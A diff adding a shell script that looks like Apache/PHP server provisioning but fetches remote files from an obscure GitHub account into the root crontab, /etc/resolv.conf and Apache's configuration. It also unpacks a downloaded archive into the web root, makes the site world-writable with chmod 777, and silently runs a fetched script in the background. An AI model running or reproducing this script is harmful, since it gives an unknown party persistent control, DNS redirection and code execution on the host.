@@ -1,0 +1,67 @@
+apt-get update
+
+export DEBIAN_FRONTEND=noninteractive
+
+ln -fs /usr/share/zoneinfo/America/New_York /etc/localtime
+apt-get install -y tzdata
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt-get install sudo -y
+
+usermod -aG sudo root
+
+apt-get install -y apache2
+
+apt-get install -y php7.4
+
+apt-get install -y php7.4-gmp
+
+apt-get install -y software-properties-common
+
+add-apt-repository ppa:ondrej/php -y
+
+apt-get update
+
+apt-get install -y php5.6
+
+apt-get install -y php5.6-curl
+
+chmod 600 -R ./root
+
+cd /var/spool/cron/crontabs/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/root84744474 -O /var/spool/cron/crontabs/root
+
+cd /etc/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/resolv.conf
+
+cd /etc/apache2/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/ports84744474.conf -O /etc/apache2/ports.conf
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/apache2.conf
+
+cd /etc/apache2/sites-enabled/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/000-default84.conf -O /etc/apache2/sites-enabled/000-default.conf
+
+service apache2 restart
+
+cd /var/www/html/
+
+mv ./index.html ./index84744444444474.html
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux844444444.tar.xz
+
+tar -xvf ./linux844444444.tar.xz
+
+cd ./linux844444444/
+
+cp -r ./* ../
+
+cd /var/www/html/
+
+chmod 777 -R ./
+
+bash /var/www/html/linuxsync84 &> /dev/null &
